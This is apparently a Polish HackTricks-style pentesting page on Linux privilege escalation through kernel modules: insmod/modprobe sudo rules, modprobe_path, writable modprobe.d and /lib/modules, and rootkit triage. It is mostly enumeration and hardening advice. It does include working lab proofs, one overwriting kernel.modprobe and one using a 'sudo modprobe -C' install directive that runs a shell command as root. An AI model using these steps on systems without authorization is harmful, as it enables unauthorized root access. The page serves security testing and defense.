# Nadużycia modułów jądra i modprobe

{{#include ../../banners/hacktricks-training.md}}

## Błędna konfiguracja obsługi modułów jądra i ich ładowania

Obsługa modułów jądra to obszar o dużym znaczeniu podczas analizy pod kątem eskalacji uprawnień w systemie Linux. Nie uznawaj każdej informacji o niepodpisanym module za dowód podatności, ale wykorzystaj ją, by odpowiedzieć na praktyczne pytania.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- Czy bieżący użytkownik może ładować moduły przez `sudo`, capabilities lub ścieżkę do zapisywalnego helpera?
- Czy ładowanie modułów jest nadal włączone?
- Czy weryfikacja podpisów modułów jest wyłączona?
- Czy katalogi modułów, pliki modułów lub ścieżki konfiguracji `modprobe.d` są zapisywalne?<sup>[[16]](#references)</sup>
- Czy można odczytać logi jądra, aby potwierdzić, co się wydarzyło?

Wstępna analiza zaczyna się od poniższych kontroli stanu modułów, podpisów, logowania i drzewa modułów.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretacja:

- `modules_disabled=1` oznacza, że modułów nie można ani ładować, ani usuwać, a wartości nie można zresetować do `0` przed ponownym uruchomieniem systemu.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` w wierszu poleceń jądra lub `CONFIG_MODULE_SIG_FORCE=y` wymaga prawidłowo podpisanych modułów; w przeciwnym razie mogą zostać załadowane niepodpisane moduły, co oznacza oznaczenie jądra jako zmodyfikowanego.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` nie nakłada żadnych ograniczeń na `dmesg`; gdy wartość wynosi `1`, dostęp wymaga `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- Ścieżki z prawem zapisu w `/lib/modules/$(uname -r)/` są niebezpieczne, ponieważ podczas ładowania modułów `modprobe` przeszukuje to drzewo katalogów i dane zależności.<sup>[[8]](#references)</sup>

### Ładowanie modułu i odczytywanie danych wyjściowych jądra

Jeśli masz odpowiednie uprawnienia do załadowania lokalnego modułu, `insmod` wstawia dokładnie wskazany przez Ciebie plik `.ko`. Funkcja inicjalizująca modułu uruchamia się w ramach ładowania, a komunikaty zapisywane za pomocą `printk()` trafiają do bufora dziennika jądra, który zwykle odczytuje się poleceniem `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Minimalny proces weryfikacji obejmuje użycie `modinfo` do sprawdzenia metadanych, `insmod` i `rmmod` do załadowania i usunięcia modułu, `lsmod` do potwierdzenia, że moduł jest załadowany, oraz `dmesg` do sprawdzenia dzienników jądra.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Jeśli `sudo -l` zezwala na użycie `insmod`, `modprobe` lub opakowującego je wrappera, potraktuj to jako krytyczne: `sudo -l` wyświetla uprawnienia wywołującego użytkownika, a załadowanie modułu jądra wymaga `CAP_SYS_MODULE`. Zobacz [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module), aby poznać bezpośrednie ścieżki oparte na capabilities.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` dozwolone przez sudo

Reguła sudo pozwalająca użytkownikowi uruchamiać `insmod` nie jest porównywalna z zezwoleniem na użycie zwykłego pomocnika administracyjnego. Kod inicjalizacyjny modułu uruchamia się podczas jego wstawiania, więc praktyczne pytanie podczas przeglądu brzmi: czy użytkownik może wybrać lub zmodyfikować ładowany moduł.<sup>[[3]](#references)</sup>

Poniższy ogólny przebieg przeglądu powtarza te kontrole inspekcji, ładowania, stanu, logów i usuwania dla wybranego modułu.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Jeśli użytkownik może dostarczyć dowolny plik `.ko`, podczas autoryzowanego testu należy traktować to jako pełne przejęcie systemu. Bezpieczniejszym rozwiązaniem jest niezezwalanie na ładowanie modułów przez sudo; jeśli jest to nieuniknione, należy ograniczyć dokładną ścieżkę, właściciela, uprawnienia, zasady podpisywania i procedurę usuwania.<sup>[[3]](#references)[[10]](#references)</sup>

Poniżej pokazano minimalny kod źródłowy i plik Makefile, które ilustrują nieszkodliwy sposób budowania modułu w kontrolowanym laboratorium; polecenie `make -C /lib/modules/$(uname -r)/build M=$PWD` jest zgodne z udokumentowanym przez kernel procesem kbuild dla modułów zewnętrznych.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Buduj i ładuj wyłącznie w autoryzowanym laboratorium; kbuild buduje moduł zewnętrzny, a polecenia ładowania/usuwania wywołują interfejsy modułów jądra.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Kontrole pod kątem nadużyć `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` wskazuje pomocniczy program userspace, który jądro uruchamia na żądanie automatycznego ładowania modułu; ten sysctl wpływa na automatyczne ładowanie, a nie na jawne wstawianie modułów. Jeśli atakujący może zmienić tę wartość na ścieżkę do zapisywalnego pliku wykonywalnego i wywołać żądanie załadowania modułu, ten program staje się ścieżką do wykonania kodu z uprawnieniami. Ustawienie pustego ciągu znaków wyłącza żądania automatycznego ładowania; jeśli `CONFIG_STATIC_USERMODEHELPER=y`, niepusta wartość zostaje zastąpiona wbudowaną statyczną ścieżką do programu pomocniczego.<sup>[[1]](#references)</sup>

Sprawdź bieżącą ścieżkę do programu pomocniczego za pośrednictwem interfejsu sysctl jądra oraz sprawdź właściciela i uprawnienia pliku docelowego.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Sprawdź, czy można wpływać na sysctl, delegowane reguły sudo lub capabilities plików.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Poniższy wzorzec przeznaczony wyłącznie do laboratorium zmienia ścieżkę pomocnika i wywołuje udokumentowane żądanie automatycznego ładowania modułu; używaj go tylko w odizolowanym, autoryzowanym systemie.<sup>[[1]](#references)</sup>

W aktualnych jądrach Linux nie używaj nieznanego pliku wykonywalnego jako uniwersalnego wyzwalacza: starszy mechanizm automatycznego ładowania modułu dla niestandardowych formatów binarnych został usunięty w Linux 6.14, a dokumentacja jądra wskazuje nieznany typ systemu plików jako ścieżkę żądania automatycznego ładowania modułu.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

W zahardeningowanych systemach powinno to zakończyć się niepowodzeniem, jeśli uprawnienia uniemożliwiają nieuprzywilejowany zapis do `kernel.modprobe`, ścieżka do helpera nie jest zapisywalna lub automatyczne ładowanie modułów jest wyłączone.<sup>[[1]](#references)</sup>

### Zapisywalna konfiguracja `modprobe.d` i `sudo modprobe -C`

Przed rozwiązaniem modułu `modprobe` odczytuje pliki `.conf` z katalogów konfiguracyjnych, takich jak `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` i `/lib/modprobe.d`, w kolejności pierwszeństwa. Plik o tej samej nazwie w katalogu o wyższym priorytecie przesłania plik o niższym priorytecie. Co ważniejsze, dyrektywa `install <module> <command>` uruchamia dowolne polecenie powłoki **zamiast** wstawiać moduł. Dlatego zapisywalna ścieżka konfiguracji może umożliwić opóźnione wykonanie polecenia z uprawnieniami późniejszego, uprzywilejowanego wywołującego `modprobe`; wymuszanie podpisów modułów jądra nie uwierzytelnia tego polecenia w przestrzeni użytkownika.<sup>[[16]](#references)</sup>

Sprawdź uprawnienia katalogów i plików, a następnie przejrzyj efektywną konfigurację. `modprobe -n -v` jest bezpieczne do przeglądu rozwiązywania modułów, ponieważ tryb próbny nie wstawia modułu ani nie wykonuje polecenia `install`/`remove`. Zamiast przestarzałej składni `--showconfig` używaj `modprobe -c`; bieżąca dokumentacja kmod wskazuje, że ta pierwsza zostanie usunięta po wersji kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Nieograniczona reguła sudo dla `modprobe` jest możliwa do wykorzystania nawet wtedy, gdy dowolne pliki `.ko` nie przechodzą weryfikacji podpisu: `-C` wskazuje kontrolowany przez atakującego katalog konfiguracji, z którego proces uruchomiony przez sudo może wykonać polecenie `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

W ramach ograniczania ryzyka nie zezwalaj przez sudo na uruchamianie `modprobe` z dowolnymi argumentami, zachowaj własność roota nad każdym katalogiem konfiguracyjnym i brak uprawnień do zapisu oraz sprawdzaj nieoczekiwane dyrektywy `install`/`remove`. Gdy zaufany przepływ administracyjny musi pominąć takie dyrektywy dla jednego modułu, `modprobe --ignore-install` ignoruje je dla wskazanego modułu, ale zależności nadal mogą mieć własne polecenia.<sup>[[8]](#references)[[16]](#references)</sup>

### Przegląd zapisywalnego `/lib/modules`

Zapisywalne katalogi modułów mogą umożliwiać podmianę modułów, umieszczanie złośliwych modułów lub nadużywanie automatycznego ładowania — zależnie od późniejszego sposobu wywołania `modprobe`; `modprobe` przeszukuje `/lib/modules/$(uname -r)` i korzysta z zapisanych tam danych o zależnościach przy rozwiązywaniu nazw modułów.<sup>[[8]](#references)</sup>

Sprawdź zapisywalne pliki modułów oraz metadane zależności i aliasów w drzewie modułów aktywnego wydania jądra.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Jeśli znajdziesz zawartość modułu z prawem zapisu, sprawdź, jak `modprobe` rozwiązuje zależności i jak `modinfo` raportuje metadane modułu.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Uwagi dotyczące zabezpieczeń:

- Katalog `/lib/modules` powinien należeć do `root:root` i nie być zapisywalny przez użytkowników.<sup>[[8]](#references)</sup>
- Jeśli jest to możliwe operacyjnie, ustaw `kernel.modules_disabled=1` po uruchomieniu systemu.<sup>[[1]](#references)</sup>
- Wymuś podpisywanie modułów w systemach, które wymagają ładowalnych modułów.<sup>[[2]](#references)</sup>
- Monitoruj zapisy do `/proc/sys/kernel/modprobe`, `/lib/modules` i katalogów konfiguracji `modprobe.d`, a także nieoczekiwane uruchomienia `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Wstępna analiza rootkita opartego na module

Złośliwy moduł może przechwytywać wywołania systemowe, widoki VFS lub `/proc`, ścieżki sieciowe albo kontrole poświadczeń, aby ukrywać procesy i pliki, przekierowywać ruch lub przechwytywać poufne informacje. Może też usunąć się z listy modułów wyświetlanej przez `lsmod`. Mechanizmy utrwalania mogą wykorzystywać aliasy lub reguły instalacji w `modprobe.d`, `/etc/modules-load.d`, jednostkę systemd, zawartość initramfs albo podmianę legalnego pliku `.ko`. Zwykły wynik `lsmod` jest przydatnym dowodem, ale przy kompromitacji na poziomie jądra listy udostępniane przez jądro mogą być niewiarygodne. Porównuj załadowane moduły, pliki na dysku, konfigurację rozruchu, dzienniki ładowania modułów i zaufane dane telemetryczne z zewnętrznych źródeł.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Sprawdź nieoczekiwane nazwy modułów, ścieżki, zależności, sygnatury i czasy ładowania. Komunikaty o taintowaniu kernela i niepodpisanych modułach są wskazówkami, a nie dowodem na obecność rootkita. Jeśli podejrzewasz rootkita, zbierz dowody z zaufanego obrazu lub środowiska odzyskiwania, zanim zaczniesz polegać na danych wyjściowych działającego kernela. Strona [oceny podatności kernela](kernel-vulnerability-assessment.md) omawia konfigurację i ekspozycję diagnostyczną, w tym tracefs i przypięte obiekty BPF.

## References

- [1] [Dokumentacja dotycząca /proc/sys/kernel/ — dokumentacja Linux Kernel](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Mechanizm podpisywania modułów kernela — dokumentacja Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — strona podręcznika Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Podstawy sterowników — dokumentacja Linux Kernel](https://docs.kernel.org/driver-api/basics.html)
- [6] [Logowanie komunikatów za pomocą printk — dokumentacja Linux Kernel](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Budowanie modułów zewnętrznych — dokumentacja Linux Kernel](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — strona podręcznika Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Scal tag „execve-v6.14-rc1” — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — strona podręcznika Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — strona podręcznika Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
{{#include ../../banners/hacktricks-training.md}}
